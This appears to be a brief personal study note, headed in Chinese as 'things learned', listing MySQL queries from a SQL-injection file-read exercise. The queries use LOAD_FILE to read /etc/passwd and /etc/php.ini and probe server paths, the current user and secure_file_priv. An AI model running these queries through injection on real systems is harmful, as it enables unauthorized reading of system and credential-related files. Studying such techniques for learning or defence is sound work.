---
title: SQL Injection LFI Success
description: SQL Injection LFI Success
last_update:
  date: "2025-08-23T08:00:00+08:00"
---

## 學到的東西

```sql
SELECT LOAD_FILE('/etc/passwd')
SELECT LOAD_FILE('/etc/php.ini')
SELECT @@basedir
SELECT @@datadir
SELECT CURRENT_USER()
SELECT @@secure_file_priv
SELECT variable_value FROM information_schema.global_variables WHERE variable_name = 'secure_file_priv'
```
